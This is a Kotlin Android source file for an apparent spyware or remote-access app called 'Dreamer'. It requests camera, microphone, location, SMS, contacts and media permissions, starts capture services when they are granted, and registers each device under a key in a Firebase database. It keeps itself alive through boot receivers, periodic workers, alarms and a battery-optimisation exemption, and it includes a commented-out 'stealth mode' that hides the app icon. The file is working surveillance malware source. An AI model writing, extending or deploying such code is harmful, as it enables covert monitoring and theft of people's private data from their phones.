package com.h4k3r.dreamer

import android.Manifest
import android.app.ActivityManager
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import androidx.work.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.security.MessageDigest
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {

    /* ── Device ID Generation ─────────────────────── */
    private fun deviceId(): String {
        val androidId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        return MessageDigest.getInstance("SHA-256")
            .digest(androidId.toByteArray())
            .take(6)
            .joinToString("") { "%02x".format(it) }
    }

    /* ── Secret Key from Assets ─────────────────── */
    private fun getSecretKey(): String? {
        return try {
            assets.open("secret_key.txt")
                .bufferedReader()
                .readLine()
                ?.trim()
                ?.takeIf { it.isNotEmpty() }
        } catch (e: Exception) {
            null
        }
    }

    /* ── Runtime Permissions ────────────────────── */
    private val corePerms = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE
    )

    private val mediaPerms = if (Build.VERSION.SDK_INT >= 33) {
        arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )
    } else {
        arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
    }

    // Permissions for Android 13+
    private val notificationPerm = if (Build.VERSION.SDK_INT >= 33) {
        arrayOf(Manifest.permission.POST_NOTIFICATIONS)
    } else {
        emptyArray()
    }

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        afterPermissionCheck()
    }

    /* ── Hide App Icon (Stealth Mode) ───────────── */
    private fun setAppVisibility(visible: Boolean) {
        val componentName = ComponentName(this, MainActivity::class.java)
        val state = if (visible) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        }

        packageManager.setComponentEnabledSetting(
            componentName,
            state,
            PackageManager.DONT_KILL_APP
        )
    }

    /* ── Lifecycle ──────────────────────────────── */
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Get secret key
        val secretKey = getSecretKey()
        if (secretKey == null) {
            Toast.makeText(
                this,
                "⚠️ Configuration Error: Missing secret_key.txt in assets folder",
                Toast.LENGTH_LONG
            ).show()
            finish()
            return
        }

        // Get device ID
        val deviceId = deviceId()

        // Store key and device ID in shared preferences for services
        getSharedPreferences("dreamer_auth", MODE_PRIVATE).edit().apply {
            putString("secret_key", secretKey)
            putString("device_id", deviceId)
            apply()
        }

        // Register device info in Firebase
        registerDevice(secretKey, deviceId)

        // Request all permissions
        val allPerms = corePerms + mediaPerms + notificationPerm
        permLauncher.launch(allPerms)

        // Setup background persistence
        setupBackgroundPersistence()

        // Request battery optimization exemption
        requestBatteryOptimizationExemption()

        // Schedule periodic permission check
        schedulePermissionCheck()

        // Show success message
        Toast.makeText(
            this,
            "✅ Dreamer App Initialized\nDevice ID: ${deviceId.take(6)}...",
            Toast.LENGTH_LONG
        ).show()

        // Optional: Hide app after 5 seconds (uncomment for stealth mode)
        // android.os.Handler(mainLooper).postDelayed({
        //     setAppVisibility(false)
        //     Toast.makeText(this, "App is now running in background", Toast.LENGTH_SHORT).show()
        // }, 5000)
    }

    /* ── Firebase Registration ──────────────────── */
    private fun registerDevice(key: String, deviceId: String) {
        val deviceInfo = mapOf(
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "android" to Build.VERSION.SDK_INT,
            "sdk_name" to Build.VERSION.RELEASE,
            "time" to System.currentTimeMillis(),
            "app_version" to "2.0.0",
            "battery" to getBatteryLevel(),
            "storage" to getStorageInfo(),
            "permissions" to checkAllPermissions()
        )

        Firebase.database.reference
            .child("devices")
            .child(key)
            .child(deviceId)
            .child("info")
            .setValue(deviceInfo)
            .addOnSuccessListener {
                updateDeviceStatus(key, deviceId, true)
            }
    }

    /* ── Check All Permissions ──────────────────── */
    private fun checkAllPermissions(): Map<String, Boolean> {
        val permissions = mutableMapOf<String, Boolean>()

        // Core permissions
        permissions["camera"] = hasPerm(Manifest.permission.CAMERA)
        permissions["location"] = hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)
        permissions["contacts"] = hasPerm(Manifest.permission.READ_CONTACTS)
        permissions["sms"] = hasPerm(Manifest.permission.READ_SMS)
        permissions["phone"] = hasPerm(Manifest.permission.READ_PHONE_STATE)
        permissions["microphone"] = hasPerm(Manifest.permission.RECORD_AUDIO)

        // Storage permissions
        if (Build.VERSION.SDK_INT >= 33) {
            permissions["storage"] = hasPerm(Manifest.permission.READ_MEDIA_IMAGES) &&
                    hasPerm(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions["storage"] = hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        // Special permissions
        permissions["all_files"] = if (Build.VERSION.SDK_INT >= 30) {
            Environment.isExternalStorageManager()
        } else true

        permissions["notifications"] = if (Build.VERSION.SDK_INT >= 33) {
            hasPerm(Manifest.permission.POST_NOTIFICATIONS)
        } else true

        return permissions
    }

    /* ── Update Online Status ───────────────────── */
    private fun updateDeviceStatus(key: String, deviceId: String, online: Boolean) {
        Firebase.database.reference
            .child("devices")
            .child(key)
            .child(deviceId)
            .child("status")
            .setValue(
                mapOf(
                    "online" to online,
                    "lastSeen" to System.currentTimeMillis()
                )
            )
    }

    /* ── Background Persistence Setup ──────────── */
    private fun setupBackgroundPersistence() {
        // Schedule WorkManager periodic task
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(false)
            .build()

        val keepAliveWork = PeriodicWorkRequestBuilder<KeepAliveWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .addTag("dreamer_keepalive")
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "dreamer_keepalive",
            ExistingPeriodicWorkPolicy.REPLACE,
            keepAliveWork
        )

        // Setup restart on boot
        setupBootReceiver()
    }

    /* ── Request Battery Optimization Exemption ─── */
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)

                Toast.makeText(
                    this,
                    "⚡ Please allow battery optimization exemption for uninterrupted service",
                    Toast.LENGTH_LONG
                ).show()
            }
        }
    }

    /* ── Setup Boot Receiver ────────────────────── */
    private fun setupBootReceiver() {
        val receiver = ComponentName(this, BootReceiver::class.java)
        packageManager.setComponentEnabledSetting(
            receiver,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /* ── Schedule Permission Check ──────────────── */
    private fun schedulePermissionCheck() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, PermissionCheckReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Check permissions every 6 hours
        alarmManager.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + (6 * 60 * 60 * 1000),
            6 * 60 * 60 * 1000,
            pendingIntent
        )
    }

    /* ── Helper Methods ─────────────────────────── */
    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(
            null,
            android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
        val level = batteryIntent?.getIntExtra("level", -1) ?: -1
        val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
        return if (level != -1 && scale != -1) {
            (level * 100 / scale)
        } else {
            -1
        }
    }

    private fun getStorageInfo(): Map<String, Long> {
        val stat = android.os.StatFs(Environment.getExternalStorageDirectory().path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong

        return mapOf(
            "total" to totalBlocks * blockSize,
            "available" to availableBlocks * blockSize
        )
    }

    private fun hasPerm(p: String): Boolean =
        PermissionChecker.checkSelfPermission(this, p) ==
                PermissionChecker.PERMISSION_GRANTED

    /* ── Service Starter ────────────────────────── */
    private fun afterPermissionCheck() {
        // Start each service if its permissions are granted
        if (hasPerm(Manifest.permission.CAMERA)) {
            startServiceWithAuth(CameraService::class.java)
        }

        if (hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
            startServiceWithAuth(DataService::class.java)
        }

        if (mediaPerms.any { hasPerm(it) }) {
            startServiceWithAuth(FilesService::class.java)
            startServiceWithAuth(GalleryService::class.java)
        }

        // Start permission monitor service
        startServiceWithAuth(PermissionMonitorService::class.java)

        // For Android 11+, suggest All Files Access
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(
                Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    .setData(Uri.parse("package:$packageName"))
            )
            Toast.makeText(
                this,
                "📁 Please enable 'All files access' for full file management",
                Toast.LENGTH_LONG
            ).show()
        }

        // Update permissions in Firebase
        updatePermissionsInFirebase()
    }

    private fun startServiceWithAuth(serviceClass: Class<*>) {
        val intent = Intent(this, serviceClass)
        ContextCompat.startForegroundService(this, intent)
    }

    private fun updatePermissionsInFirebase() {
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        val key = prefs.getString("secret_key", null)
        val deviceId = prefs.getString("device_id", null)

        if (key != null && deviceId != null) {
            Firebase.database.reference
                .child("devices")
                .child(key)
                .child(deviceId)
                .child("info")
                .child("permissions")
                .setValue(checkAllPermissions())
        }
    }

    /* ── Check if Service is Running ───────────── */
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    /* ── Cleanup on Destroy ─────────────────────── */
    override fun onDestroy() {
        // Update offline status
        getSharedPreferences("dreamer_auth", MODE_PRIVATE).apply {
            val key = getString("secret_key", null)
            val deviceId = getString("device_id", null)
            if (key != null && deviceId != null) {
                updateDeviceStatus(key, deviceId, false)
            }
        }
        super.onDestroy()
    }
}

/* ── KeepAlive Worker for Background Persistence ── */
class KeepAliveWorker(
    context: Context,
    params: WorkerParameters
) : Worker(context, params) {

    override fun doWork(): Result {
        // Restart services if they're not running
        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java,
            PermissionMonitorService::class.java
        )

        services.forEach { serviceClass ->
            if (!isServiceRunning(serviceClass)) {
                val intent = Intent(applicationContext, serviceClass)
                ContextCompat.startForegroundService(applicationContext, intent)
            }
        }

        // Update heartbeat in Firebase
        updateHeartbeat()

        return Result.success()
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    private fun updateHeartbeat() {
        val prefs = applicationContext.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        val key = prefs.getString("secret_key", null)
        val deviceId = prefs.getString("device_id", null)

        if (key != null && deviceId != null) {
            Firebase.database.reference
                .child("devices")
                .child(key)
                .child(deviceId)
                .child("info")
                .child("last_heartbeat")
                .setValue(System.currentTimeMillis())
        }
    }
}